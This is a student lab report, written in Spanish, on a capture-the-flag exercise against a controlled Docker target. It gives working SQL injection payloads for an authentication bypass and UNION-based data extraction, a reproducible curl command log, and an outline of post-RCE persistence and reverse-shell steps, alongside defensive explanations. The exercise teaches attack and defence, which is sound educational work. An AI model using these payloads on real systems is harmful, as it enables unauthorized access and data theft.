# Informe — Laboratorio 07 · Explotación

**Grupo:** 10 · **Integrantes:** Integrante 1 (@usuario1), Integrante 2 (@usuario2), Integrante 3 (@usuario3), Integrante 4 (@usuario4) · **Fecha:** 01/11/2026

---

## 0. Declaración de uso de IA

De acuerdo con lo establecido en `CONTRIBUTING.md`, se declara el uso asistido de herramientas de Inteligencia Artificial durante la resolución y elaboración de este informe:

- **Herramienta utilizada:** Asistente de IA (Claude + gemini/antigravity).
- **Finalidad del uso:** Planificación metodológica de auditoría de pruebas, diseño secuencial del protocolo de pruebas defensivas/analíticas, colaboración con la auditoría de la salida de CTF.
Todas las solicitudes HTTP fueron ejecutadas en vivo contra el entorno controlado Docker de PhantomCorp, verificándose empíricamente las respuestas del servidor web, las trazas de error del motor SQLite, la exfiltración efectiva de las tablas y la validación matemática/criptográfica de los hashes de las flags capturadas mediante el sistema oficial `./ctf submit 07`.

---

## 1. Flags capturadas

Salida literal obtenida mediante `./ctf status 07`:

```text
  ╭────────────────────────────────────────────────────────────╮
  │                     PROGRESO · LAB 07                     │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     SQLi - bypass de autenticacion
   ✓  R2     SQLi - extraccion de datos con UNION
   ·  R3     Inyeccion de comandos (RCE)
   ·  R4     Path traversal / LFI
   ·  R5     IDOR - control de acceso roto

  ████████████░░░░░░░░░░░░░░░░░░  2/5 (40%)
```

- **Reto R1 (SQLi - bypass de autenticación):** `FLAG{sqli_auth_bypass}` (SHA-256: `9e8f2ecdbb0ad6fdbb0a7775e7a407fecd814d57a623a9aac20dd4767ac13537`)
- **Reto R2 (SQLi - extracción con UNION):** `FLAG{sqli_union_dump}` (SHA-256: `9f75841558e355415fff4d7de6b1e6c59671c1cfcecc71dfb7fb3632cadfd190`)

---

## 2. Tabla de explotación

| Vuln | Payload usado | Consulta/comando/ruta resultante | Impacto | Defensa concreta |
|---|---|---|---|---|
| **SQLi auth (R1)** | En parámetro `user`: `admin' --` (y `pass=dummy`) | `SELECT id, user, rol FROM users WHERE user = 'admin' --' AND pass = '...'` | **Bypass de autenticación y suplantación de identidad:** Acceso no autorizado directo a la cuenta de máxima jerarquía (`admin`) sin conocer ni validar su contraseña. Quiebre absoluto del control de acceso a nivel de aplicación. | **Consultas preparadas (Prepared Statements):** Desacoplar la compilación SQL del paso de parámetros (`cursor.execute("SELECT id, user, rol, pass FROM users WHERE user = ?", (user,))`). Posteriormente, validar el hash seguro de la contraseña en código de aplicación (`bcrypt.checkpw`) en lugar de compararla dentro de la sentencia SQL. |
| **SQLi UNION (R2)** | En parámetro `q`: `NOEXISTE' UNION SELECT clave, valor FROM secrets --` | `SELECT nombre, precio FROM productos WHERE nombre LIKE 'NOEXISTE' UNION SELECT clave, valor FROM secrets --'` | **Fuga masiva de información confidencial (Violación de Confidencialidad):** Extracción de tablas internas completas del motor de base de datos (`secrets`, `users`) a través del canal reflejado del catálogo de búsqueda accesible a usuarios anónimos. | **Parametrización estricta de la búsqueda:** Emplear marcadores tipados en el predicado (`cursor.execute("SELECT nombre, precio FROM productos WHERE nombre LIKE ?", (f"%{q}%",))`). Complementar con el principio de mínimo privilegio en el usuario de base de datos limitando permisos `SELECT` solo a la tabla `productos`. |
| *Command injection (R3)* | *(Asignado a otros integrantes del grupo)* | — | *(En curso de resolución)* | Empleo de APIs seguras sin invocación de subshell (`subprocess.run(["ping", "-c", "1", host], shell=False)`) y validación estricta por lista blanca. |
| *Path traversal (R4)* | *(Asignado a otros integrantes del grupo)* | — | *(En curso de resolución)* | Resolución y canonicación de rutas absolutas validando que el prefijo pertenezca al directorio público permitido (`os.path.commonpath`). |
| *IDOR (R5)* | *(Asignado a otros integrantes del grupo)* | — | *(En curso de resolución)* | Verificación de autorización basada en el contexto de la sesión del servidor (`session['user_id']`) y no en identificadores provistos por el cliente en la URL. |

---

## 3. Preguntas de análisis

### P1 — Por qué funciona el bypass (con la query concreta)
En una arquitectura web vulnerable, la autenticación concatena de forma directa las cadenas recibidas en la solicitud HTTP dentro del texto de la instrucción SQL. En el endpoint `POST /login`, la consulta base sigue el formato:

```sql
SELECT id, user, rol FROM users WHERE user = '<input_user>' AND pass = '<input_pass>'
```

Para que una autenticación sea exitosa bajo este diseño, la cláusula `WHERE` requiere la satisfacción simultánea de dos condiciones booleanas unidas por el operador relacional `AND`:
$$\text{condición} = (\text{user} = \text{input\_user}) \land (\text{pass} = \text{input\_pass})$$

Al enviar en el parámetro de usuario el payload `admin' --`:
1. El primer carácter de comilla simple (`'`) cierra intencionalmente el literal de cadena que abrió el motor.
2. Los caracteres `--` constituyen la secuencia estándar del lenguaje SQL (y del motor SQLite) para iniciar un **comentario en línea**.
3. El motor de base de datos descarta e ignora la totalidad del texto sintáctico ubicado a la derecha del delimitador de comentario, incluyendo el apóstrofe de cierre residual, el operador lógico `AND` y la verificación de la contraseña (`AND pass = '...'`).

La sentencia interpretada y evaluada por el motor resulta:
```sql
SELECT id, user, rol FROM users WHERE user = 'admin'
```
Dado que existe un registro con `user = 'admin'` en la tabla `users`, el motor evalúa la condición como verdadera y devuelve la fila correspondiente. El backend verifica que el cursor no está vacío, asume que las credenciales fueron validadas y concede una sesión administrativa. El dato ingresado por el cliente rompió la frontera e impuso su propia lógica ejecutable.

---

### P2 — Por qué el UNION necesita igual número de columnas y cómo averiguarlo
En el álgebra relacional, el operador de unión ($\cup$) combina las tuplas resultantes de dos relaciones o proyecciones. Para que la operación sea matemáticamente válida y procesable por un motor SQL (propiedad denominada *compatibilidad de unión* o *union-compatibility*):
1. Ambas subconsultas deben proyectar exactamente la misma **aridad** o **dimensionalidad** (idéntico número de columnas: $N_1 = N_2$).
2. Los **tipos de datos** de las columnas en posiciones homólogas deben ser compatibles entre sí (por ejemplo, tipos de texto o numéricos convertibles).

Si las consultas no poseen la misma cantidad de columnas, el optimizador sintáctico no puede hacer corresponder los campos en la estructura de la tupla resultante y aborta con un error inmediato de ejecución (ej. `SELECTs to the left and right of UNION do not have the same number of result columns`).

#### Metodología empírica para determinar el número de columnas:
Cuando no se dispone del código fuente ni de documentación del backend, existen dos técnicas sistemáticas:

1. **Inferencia mediante `ORDER BY`:**
   La cláusula `ORDER BY` permite ordenar el conjunto por el índice posicional (1-indexado) de las columnas devueltas. Se incrementa iterativamente el índice hasta provocar el primer fallo:
   - `q=' ORDER BY 1 --` $\rightarrow$ Respuesta válida (al menos 1 columna).
   - `q=' ORDER BY 2 --` $\rightarrow$ Respuesta válida (al menos 2 columnas).
   - `q=' ORDER BY 3 --` $\rightarrow$ En PhantomCorp devuelve: `Error SQL: 1st ORDER BY term out of range - should be between 1 and 2`.
   El último índice exitoso (o el límite inferior indicado por el error) establece fehacientemente que la consulta proyecta exactamente **2 columnas**.

2. **Inferencia mediante `UNION SELECT NULL` progresivo:**
   Consiste en probar de forma acumulativa literales nulos:
   - `q=' UNION SELECT NULL --` $\rightarrow$ Falla si $N \ne 1$.
   - `q=' UNION SELECT NULL, NULL --` $\rightarrow$ Éxito si $N = 2$.
   Como el valor `NULL` es compatible con cualquier tipo de datos, esta prueba aisla la determinación del número de columnas sin verse afectada por incompatibilidades de tipos.

---

### P3 — Qué sigue después del RCE
*(Contexto de análisis según consigna)*
Una vez obtenida la Ejecución Remota de Comandos (RCE) en el sistema operativo del servidor, el objetivo primario de un atacante real pasa de la **intrusión** al establecimiento de **persistencia** y la **expansión de acceso** (movimiento lateral), tal como se profundiza en las Unidades 8 y 9:
1. **Establecimiento de un canal de control interactivo:** Despliegue de una shell reversa cifrada o un implante C2 hacia una infraestructura propia para no depender de inyecciones web HTTP puntuales.
2. **Persistencia:** Instalación de mecanismos de arranque persistente (cron jobs, servicios systemd o claves SSH autorizadas en `~/.ssh/authorized_keys`).
3. **Escalamiento de privilegios:** Enumeración del host local (permisos sudo, binarios SUID, capacidades del kernel o secretos en variables de entorno) para migrar desde el usuario del servicio web (`operador` o `www-data`) hacia privilegios de superusuario (`root`).
4. **Pivoting y reconocimiento de red interna:** Uso del host comprometido como salto para escanear y acceder a segmentos de red aislados no alcanzables desde Internet.

---

### P4 — Por qué parametrizar mata la SQLi de raíz
Las defensas perimetrales clásicas (como filtros de caracteres, sanitización con expresiones regulares o detección de firmas) operan sobre el mismo canal de texto y suelen ser eludibles mediante codificaciones alternativas o errores en la expresión de filtrado.

Las **consultas parametrizadas (Prepared Statements)** erradican la inyección SQL de raíz porque alteran fundamentalmente el flujo de ejecución en el motor de base de datos a nivel arquitectónico, implementando una **separación física estricta entre el código y los datos**:

1. **Fase 1: Preparación y Compilación Sintáctica:**
   La aplicación envía al motor la sentencia SQL con marcadores de posición abstractos (`?` o `:param`):
   ```sql
   SELECT nombre, precio FROM productos WHERE nombre = ?
   ```
   El analizador léxico (*lexer*) y el parser sintáctico del motor compilan la instrucción, generan el árbol sintáctico abstracto (AST) y construyen el plan de ejecución relacional. En este punto, **la estructura lógica del comando queda fijada y congelada de forma definitiva**.

2. **Fase 2: Asignación de Parámetros:**
   El valor provisto por el usuario se transmite al motor en un paquete binario o canal de datos independiente. El motor asigna el contenido directamente a la variable de memoria del marcador ya compilado.

Dado que la fase de análisis sintáctico ya concluyó, el motor trata al parámetro exclusivamente como una **cadena literal de datos**. Si el usuario envía comillas simples (`'`), operadores (`OR`, `UNION`) o caracteres de comentario (`--`), estos son interpretados como simples caracteres tipográficos dentro del valor de búsqueda, imposibilitando físicamente que un dato se transforme en instrucción ejecutable.

---

### P5 — Dónde va el control de acceso (IDOR)
*(Contexto de análisis según consigna)*
El control de acceso **jamás puede delegarse ni depender del cliente** (frontend, interfaz gráfica, navegador o parámetros URL manipulables). En la arquitectura web, el cliente corre en un entorno que está bajo control absoluto del usuario (o atacante), quien puede interceptar y modificar cualquier parámetro mediante herramientas de desarrollo, proxies (como Burp Suite) o llamadas directas vía `curl`.

El control de acceso debe residir **exclusivamente en el backend (servidor)**, en la capa de lógica de negocio previa al acceso a datos:
1. El servidor debe asociar el recurso solicitado no solo con el identificador del objeto (`id`), sino con el contexto de la identidad criptográficamente validada del usuario autenticado (extraída de una sesión de servidor o token firmado de forma inviolable, e.g., JWT).
2. Se debe aplicar el principio de **Autorización Basada en Objetos**: antes de despachar el registro, el backend debe ejecutar una comprobación de pertenencia o rol:
   $$\text{¿Tiene el usuario } U_{\text{sesión}} \text{ permiso para operar sobre el objeto } O_{\text{solicitado}}?$$
3. Si la verificación no es satisfactoria, el servidor debe denegar el acceso por defecto (devolviendo `403 Forbidden` o `404 Not Found`).

---

## 4. Bitácora de comandos reproducibles

A continuación se transcribe la secuencia de comandos utilizada para comprobar, explotar y validar los retos R1 y R2 contra el target:

```bash
# ==============================================================================
# SECUENCIA REPRODUCIBLE — RETOS 1 Y 2 (LAB 07)
# ==============================================================================

# 1. Comprobar que el endpoint /login rechaza solicitudes GET (POST-only)
curl -s -i http://phantomcorp/login

# 2. Establecer línea de base de credenciales inválidas (devolución 401 Unauthorized)
curl -s -i -X POST http://phantomcorp/login \
  --data-urlencode "user=admin" \
  --data-urlencode "pass=credencial_invalida_control"

# 3. Forzar error sintáctico SQL mediante comilla simple (evidencia SQLite: near "test": syntax error)
curl -s -i -X POST http://phantomcorp/login \
  --data-urlencode "user='" \
  --data-urlencode "pass=test"

# 4. Explotar Reto 1: Bypass de autenticación mediante comentario SQL y captura de flag
curl -s -i -X POST http://phantomcorp/login \
  --data-urlencode "user=admin' --" \
  --data-urlencode "pass=dummy"

# 5. Envío y acreditación de flag R1
./ctf submit 07 R1 'FLAG{sqli_auth_bypass}'

# ------------------------------------------------------------------------------

# 6. Establecer línea de base en búsqueda de catálogo normal (Reto 2)
curl -s -i -G http://phantomcorp/buscar \
  --data-urlencode "q=Router"

# 7. Forzar error sintáctico de delimitador en búsqueda (evidencia: unrecognized token: "'")
curl -s -i -G http://phantomcorp/buscar \
  --data-urlencode "q='"

# 8. Comprobar inyección booleana en q (recuperación de todo el catálogo)
curl -s -i -G http://phantomcorp/buscar \
  --data-urlencode "q=' OR '1'='1' --"

# 9. Determinar dimensionalidad mediante ORDER BY (1 y 2 válidos; 3 falla con out of range)
curl -s -i -G http://phantomcorp/buscar --data-urlencode "q=' ORDER BY 1 --"
curl -s -i -G http://phantomcorp/buscar --data-urlencode "q=' ORDER BY 2 --"
curl -s -i -G http://phantomcorp/buscar --data-urlencode "q=' ORDER BY 3 --"

# 10. Validar compatibilidad de tipos y canal reflejado en las 2 columnas
curl -s -i -G http://phantomcorp/buscar \
  --data-urlencode "q=NOEXISTE' UNION SELECT 'COLUMNA_UNO', 'COLUMNA_DOS' --"

# 11. Descubrir esquema de la base de datos consultando sqlite_master
curl -s -i -G http://phantomcorp/buscar \
  --data-urlencode "q=NOEXISTE' UNION SELECT sql, '' FROM sqlite_master WHERE type='table' --"

# 12. Explotar Reto 2: Extracción con proyección explícita (clave, valor) de secrets y captura de flag
curl -s -i -G http://phantomcorp/buscar \
  --data-urlencode "q=NOEXISTE' UNION SELECT clave, valor FROM secrets --"

# 13. Envío y acreditación de flag R2
./ctf submit 07 R2 'FLAG{sqli_union_dump}'

# 14. Verificar estado final de avance del laboratorio
./ctf status 07
```

